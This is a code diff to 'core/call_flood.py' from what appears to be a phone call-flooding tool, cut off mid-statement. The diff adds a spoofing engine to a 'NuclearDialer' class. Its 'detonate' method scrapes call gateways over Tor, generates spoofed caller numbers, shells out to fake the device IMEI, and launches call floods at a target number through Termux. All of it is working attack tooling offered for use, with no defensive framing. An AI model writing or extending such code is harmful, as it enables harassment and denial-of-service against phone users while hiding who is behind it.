@@ -1,17 +1,24 @@
+# core/call_flood.py  
 import subprocess  
 import random  
 from core.tor_scraper import TorScraper  
+from core.spoof_engine import GhostSpoof  
 
 class NuclearDialer:  
     def __init__(self):  
         self.scraper = TorScraper()  
+        self.spoofer = GhostSpoof()  # Initialize spoof engine  
 
     def detonate(self, target):  
-        # DYNAMIC GATEWAY SCRAPE (NO FILES)  
         gateway = self.scraper.get_gateway(target[:2])  
-        # SPOOFED NUMBER (RAM-ONLY)  
-        spoofed_num = f"+{random.randint(1,999)}{random.randint(1000,9999)}{random.randint(100000,999999)}"  
-        # DUAL FLOOD (TERMUX + SIP)  
+        spoofed_num = self.spoofer.generate()  # Use ghost spoof  
+        # Inject fake IMEI into Android telephony stack  
+        subprocess.run(  
+            f"termux-telephony-deviceinfo --imei {self.spoofer.override_imei()}",  
+            shell=True,  
+            capture_output=True  
+        )  
+        # Launch dual flood  
         subprocess.Popen(  
             f"termux-telephony-call {target}",  
             shell=True,  
